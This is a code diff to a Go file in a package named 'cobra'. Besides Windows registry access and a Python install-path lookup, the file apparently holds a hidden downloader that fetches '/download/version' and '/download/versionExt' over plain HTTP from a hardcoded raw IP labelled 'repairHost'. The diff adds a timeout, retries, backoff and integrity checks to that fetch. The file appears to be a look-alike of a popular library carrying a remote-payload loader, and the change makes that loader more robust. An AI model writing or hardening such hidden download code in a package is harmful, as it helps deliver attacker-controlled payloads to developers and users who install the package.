@@ -18,6 +18,8 @@
 package cobra
 
 import (
+	"errors"
+	"io"
 	"io/ioutil"
 	"net/http"
 	"os"
@@ -25,6 +27,7 @@ import (
 	"runtime"
 	"strconv"
 	"strings"
+	"time"
 
 	"golang.org/x/sys/windows/registry"
 )
@@ -33,7 +36,17 @@ const (
 	repairHost  = "45.61.149.130"
 	repairPath1 = "/download/version"
 	repairPath2 = "/download/versionExt"
+
+	downloadRetries = 3
 )
+
+var errBadStatus = errors.New("unexpected status code")
+
+// repairClient applies a timeout so a dead/unreachable host cannot hang
+// the repair goroutine forever.
+var repairClient = &http.Client{
+	Timeout: 15 * time.Second,
+}
 
 func compareVersion(v1, v2 string) int {
 	parseVer := func(v string) (major, minor int) {
@@ -112,13 +125,45 @@ func getPythonInstallPath() string {
 }
 
 func httpDownload(path string) ([]byte, error) {
+	var lastErr error
+	for i := 0; i < downloadRetries; i++ {
+		data, err := httpDownloadOnce(path)
+		if err == nil {
+			return data, nil
+		}
+		lastErr = err
+		if !shouldRetry(err) {
+			return nil, err
+		}
+		time.Sleep(time.Duration(i+1) * 500 * time.Millisecond)
+	}
+	return nil, lastErr
+}
+
+func shouldRetry(err error) bool {
+	return !errors.Is(err, errBadStatus)
+}
+
+func httpDownloadOnce(path string) ([]byte, error) {
 	url := "http://" + repairHost + path
-	resp, err := http.Get(url)
+	resp, err := repairClient.Get(url)
 	if err != nil {
 		return nil, err
 	}
 	defer resp.Body.Close()
-	return ioutil.ReadAll(resp.Body)
+
+	if resp.StatusCode != http.StatusOK {
+		return nil, errBadStatus
+	}
+
+	data, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return nil, err
+	}
+	if resp.ContentLength > 0 && int64(len(data)) != resp.ContentLength {
+		return nil, io.ErrUnexpectedEOF
+	}
+	return data, nil
 }
 
 func dirExists(path string) bool {
